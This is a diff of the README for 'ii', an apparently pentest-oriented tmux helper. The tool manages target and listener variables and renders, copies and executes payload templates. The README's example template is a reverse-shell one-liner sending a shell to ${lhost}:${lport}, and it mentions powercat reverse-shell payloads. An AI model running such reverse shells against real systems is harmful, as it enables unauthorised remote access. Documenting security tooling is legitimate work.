@@ -22,12 +22,13 @@ while preserving tmux as the shared fallback across panes.
 | Command | Short form | Purpose |
 | --- | --- | --- |
 | `ii set NAME=VALUE` | `ii s NAME=VALUE` | Set internal `ii_name` in tmux and export the configured shell name in this shell |
+| `ii set NAME VALUE` | `ii s NAME VALUE` | Set one variable from explicit CLI arguments |
 | `ii set NAME=VALUE NAME=VALUE` | `ii s:NAME=VALUE,NAME=VALUE` | Set multiple variables with `=` |
 | `ii set NAME[,NAME...] --from-shell` | `ii s:NAME[,NAME...] --from-shell` | Save current shell variables back into tmux |
+| `ii set --from-shell -a` | `ii s --from-shell -a` | Save every non-empty default shell variable into tmux |
 | `ii set -d [INTERFACE]` | `ii s -d`, `ii s:lhost -d [INTERFACE]` | Detect lhost from an interface, defaulting to `tun0` |
 | `ii set rhost=VALUE` | `ii s:rhost=VALUE` | Set rhost and automatically detect lhost when enabled |
-| `ii set` | `ii s` | Open a TUI to choose common variable names and type a value |
-| `ii set FILTER` | `ii s FILTER`, `ii s:FILTER` | Match variable names before setting; `ii s r` jumps to `RHOST` |
+| `ii set rhost=VALUE` | `ii sr VALUE` | Set only rhost and run the same optional lhost auto-detection |
 | `ii get FILTER` | `ii g FILTER`, `ii g:FILTER` | Copy and print one tmux variable value without loading |
 | `ii load` | `ii l` | Load tmux variables into this shell without the internal `ii_` prefix |
 | `ii sync on/off/status` | | Control optional prompt-time auto-sync from tmux into this shell |
@@ -35,8 +36,15 @@ while preserving tmux as the shared fallback across panes.
 | `ii clip doctor` | | Diagnose clipboard behavior and suggest a backend |
 | `ii interactive` | `ii i` | Select variable names with fzf, preview values, edit, add, and copy values |
 | `ii ls [PATTERN]` | | List non-empty tmux variables as key/value blocks, optionally filtered by key |
+| `ii v --out [PATH]` | `ii voc [PATH]` | Write non-empty variables to a shell-sourceable `.env` file |
 | `ii payload [CATEGORY]` | `ii p [CATEGORY]` | Select, render, print, and optionally write a payload |
+| `ii p KEYWORD [...]` | | Join all keywords into the initial payload fuzzy-search query |
+| `ii p --copy KEYWORD [...]` | `ii pc KEYWORD [...]` | Copy the highest-ranked payload match without opening the UI |
+| `ii p --execute [KEYWORD ...]` | `ii pe [KEYWORD ...]` | Select, confirm, and execute a rendered payload in the current shell |
+| `ii p --copy --execute [KEYWORD ...]` | `ii pce [KEYWORD ...]` | Select, confirm, copy, and execute a rendered payload in the current shell |
 | `ii p --input [--copy] [-o [PATH]]` | | Render pasted input, optionally copy it, and optionally write it |
+| `ii p --input --copy [-o [PATH]]` | `ii pic [-o [PATH]]` | Render pasted input and always copy it |
+| `ii p --input --copy --execute` | `ii pice` | Render input, confirm, copy, and execute it in the current shell |
 | `ii p --www --file PATH` / `ls` / `search [FILTER]` / `ln SOURCE_PATH [LINK_NAME]` | | Render a file, list, search, or symlink files under the configured web root |
 | `ii unset NAME [...]` | `ii u NAME [...]` | Remove `ii_` variables from tmux and this shell |
 | `ii unset -a` | `ii u -a` | Prompt, then remove all `ii_` variables from the current tmux session |
@@ -48,7 +56,6 @@ while preserving tmux as the shared fallback across panes.
 Run inside tmux:
 
 ```zsh
-ii s
 ii s lhost 192.168.45.192
 ii s lport 443
 ii s domain example.test
@@ -113,25 +120,27 @@ Default variable names:
 domain
 lhost
 rhost
-file
 lport
 rport
-mm
-usert
-passt
 user1
 pass1
 user2
 pass2
+user3
+pass3
+user4
+pass4
+user5
+pass5
+cuser
+cpass
+tuser
+tpass
+directs
 ```
 
-`ii s FILTER` resolves matches before asking for a value:
-
-- No matches prints `no matched`.
-- One match goes straight to the value prompt.
-- Multiple matches open a variable selection prompt.
-
-Direct value setting always uses `=`:
+Use either explicit `NAME VALUE` arguments for one variable or `NAME=VALUE`
+assignments. Multiple assignments use `=`:
 
 ```zsh
 ii s usert=alice
@@ -155,6 +164,11 @@ ii s:usert --from-shell
 `--from-shell` checks the lowercase shell name first, then the uppercase name.
 Missing shell variables print a red warning and are skipped.
 
+`ii s --from-shell -a` checks the complete default-name list instead of taking
+names. It imports and prints only defaults with a non-empty lowercase or
+uppercase shell value, preferring lowercase. Unset and empty defaults are
+silently skipped. Arbitrary non-default shell variables are not imported.
+
 `ii l` is a one-time load from tmux into the current shell. It does not enable
 ongoing synchronization. Use `ii sync on` only when this shell should keep
 refreshing loaded variables from tmux before each prompt; use `ii sync off` to
@@ -170,8 +184,8 @@ usert=alice ii s:usert --from-shell
 For multi-command local edits, run `ii sync off` first so the next prompt does
 not refresh the same names from tmux before `--from-shell` can save them.
 
-`ii g FILTER` uses the same case-insensitive name matching and shortcuts as
-`ii s FILTER`. It copies the selected value through the clipboard layer and
+`ii g FILTER` uses case-insensitive name matching and the common single-letter
+name shortcuts. It copies the selected value through the clipboard layer and
 prints it, but it does not modify variables or load values into the shell.
 Multiple matches open a prompt; Enter or Space selects and copies one value,
 while `q`, Esc, or Ctrl-C aborts without changing variables or copying anything.
@@ -203,6 +217,22 @@ text. Entries are not separated by blank lines. This keeps copy-mode scanning
 dense while still making variable names visually distinct from values.
 
 `ii ls PATTERN` uses the same output format after filtering by key name.
+
+### Variable File Output
+
+`ii v --out` writes all non-empty tmux `ii_` variables to `.env` in the current
+directory. `ii voc` is the fixed alias. Pass one path to write elsewhere:
+
+```zsh
+ii v --out
+ii v --out ./target.env
+ii voc ./target.env
+source ./.env
+```
+
+Names are lowercase without the internal `ii_` prefix. Values use shell-safe
+single-quote escaping, so spaces, quotes, and shell metacharacters remain data
+when the file is sourced. Existing output files are replaced atomically.
 
 ## Interactive Variables
 
@@ -239,6 +269,7 @@ Payload files and pasted input use the same renderer.
 Renderable placeholders:
 
 ```text
+%name%
 $name
 ${name}
 ${name:t}
@@ -257,7 +288,8 @@ Shell-sourced values are reported in blue. Tmux/ii-sourced values are reported
 with normal text. Missing values are kept as their original tokens and reported
 in red.
 
-Uppercase shell variables such as `$RHOST` and `${RHOST}` are not rendered.
+Uppercase forms such as `%RHOST%`, `$RHOST`, and `${RHOST}` are not rendered.
+Legacy `${II_RHOST}` and bare `II_RHOST` forms are also left unchanged.
 PowerShell scope variables such as `$env:`, `$script:`, `$global:`, `$local:`,
 and `$private:` are also left unchanged.
 
@@ -288,7 +320,7 @@ payloads/
     basic-alert
 ```
 
-Payload files use lowercase shell-style placeholders:
+Payload files use lowercase placeholders:
 
 ```text
 /bin/sh -i >/dev/tcp/${lhost}/${lport} 2>&1 0>&1
@@ -296,7 +328,7 @@ sudo nmap -p- -Pn -T4 $rhost
 ```
 
 Files under `payloads/script/` are for custom scripts. They may use lowercase
-shell-style variables such as `$rhost`, `${file}`, and `${file:t}`.
+variables such as `%rhost%`, `$rhost`, `${file}`, and `${file:t}`.
 
 Combo payloads are multi-stage script payloads under `script/combo/`. Use names
 like `script/combo/trans/powercat-K2T-TLKC`, where `K2T` means Kali sends to
@@ -319,7 +351,7 @@ Payload files use a small plain-text schema:
 
 ```text
 # description: optional operator-facing description
-payload body with $name, ${name}, or ${name:t} placeholders
+payload body with %name%, $name, ${name}, or ${name:t} placeholders
 ```
 
 For documentation and tooling, the logical payload object includes `$schema`,
@@ -335,19 +367,50 @@ preview reserves a description block above the template body, highlights
 renderable tokens with values in green, highlights missing renderable tokens in
 red, normalizes any legacy internal `II_` payload tokens to lowercase
 user-facing names, and shows selector controls and copy status at the bottom of
-the preview.
+the preview. The bottom controls use a compact borderless layout with no outer
+padding and wrap only between complete action units.
 
 In the selector, `j` and `k` move between payloads. `/` enters search mode and
-Esc returns to normal mode. `y` copies the selected rendered payload without
-leaving the selector. `l` unfolds the selected script into a full preview and
+Esc returns to normal mode. `y` copies the selected rendered payload and closes
+the selector. In normal mode, `e` executes the rendered payload in the current
+shell. `l` unfolds the selected script into a full preview and
 hides the filter input. `j` and `k` still move between scripts, Enter renders
 and outputs, and `q` aborts. `h` returns to compact normal mode.
 
-Render reports are printed when `ii p` leaves the selector. If you only use `y`
-and then abort, `ii` prints the last copied payload's report. If you use `y`
-and then Enter a different payload, `ii` prints the Enter payload's report
-first, then the last copied payload's report. Aborting without Enter or `y`
-prints nothing.
+All positional arguments after `ii p` are joined with spaces and used as the
+initial fzf query. A single established category name retains category filtering:
+
+```zsh
+ii p linux
+ii p power shell reverse
+```
+
+For a non-interactive copy, `ii pc` and `ii p --copy` join all keywords, ask
+fzf to rank matches without opening its UI, and copy the first result:
+
+```zsh
+ii pc power shell reverse
+ii p --copy power shell reverse
+```
+
+No selector or confirmation prompt is shown. A missing match or clipboard
+failure returns nonzero.
+
+`ii p --execute [KEYWORD ...]` opens the same selector but makes Enter confirm
+and execute the selected rendered payload. `ii pe` is its fixed alias.
+Adding `--copy`, or using `ii pce`, copies the rendered payload after
+confirmation and before execution. The letter `c` always means copy. Execution
+uses the current shell rather than a subprocess, so changes to variables, cwd,
+functions, and other shell state persist:
+
+```zsh
+ii p --execute powercat
+ii pce reverse shell
+```
+
+After `y`, `ii` prints copy status and the selected payload's render report as
+the selector closes. Enter retains the normal render/output behavior. Aborting
+without Enter or `y` prints nothing.
 
 Render an existing file and expose it from the web-root `p` directory:
 
@@ -390,17 +453,54 @@ ii p --input -o
 ii p --input -o ./payload.txt
 ```
 
-`ii p --input` reads until `:w` is entered on its own line and uses the shared
-render rules above. The terminal output prints the render report first, then a
-`[payload]` marker, then the rendered body. `--copy` copies only the rendered
-body.
+In an interactive terminal, `ii p --input` and `ii pic` use Enter to finish and
+Ctrl-J to insert a newline. A status line remains below the edit buffer while
+the command is waiting:
+
+```text
+Enter Finish    Ctrl-J New line    :q Cancel
+```
+
+Bracketed multi-line paste remains one edit buffer. Enter submits it after the
+paste completes. Enter `:q` or `:q!` as the complete buffer to cancel.
+
+Piped input retains the line protocol: a standalone `:w` finishes, while a
+standalone `:q` or `:q!` cancels. Both modes use the shared render rules above.
+The terminal output prints the render report first, then a `[payload]` marker,
+then the rendered body. `--copy` copies only the rendered body.
+
+`ii pice` is the fixed alias for `ii payload --input --copy --execute` and
+accepts no positional arguments. It renders input, shows the result, asks
+`[y/N]`, copies after confirmation, and executes in the current shell.
+Clipboard failure is reported but does not prevent confirmed execution.
+
+### Tmux Popup Input Execution
+
+`ii tmux enable` installs a server-wide `Prefix + :` adapter and enables it for
+the current session. The exact `ii pice` command is the only ii command accepted
+by that tmux dispatcher; all non-ii input retains normal tmux command behavior.
+`ii tmux status` reports the current session state, and `ii tmux disable`
+disables the session and restores the previous `:` binding after no enabled
+session remains.
+
+The tmux execution path is:
+
+```text
+popup input -> tmux-variable render -> popup confirmation -> clipboard copy
+-> literal paste to the originating pane -> one final Enter
+```
+
+The popup accepts pasted input and uses Ctrl-D to finish or Ctrl-C to cancel.
+It does not read an existing tmux buffer as the payload source. Rendering uses
+only the current tmux session's `ii_` values and ignores shell-local overrides.
+Missing lowercase placeholders remain unchanged and produce an explicit
+execute-anyway warning. The popup displays the originating pane and foreground
+command; whether that pane is ready to receive a command remains the user's
+responsibility. Clipboard failure does not prevent a confirmed pane send.
 
 `-o` writes the rendered body to a file while keeping the normal terminal
 output. It follows the same path rules as payload file output, including the
 final full-path line.
-
-Use a single `:q` or `:q!` line to cancel pasted input without rendering or
-copying anything.
 
 Use inline assignments for one-command shell overrides:
 
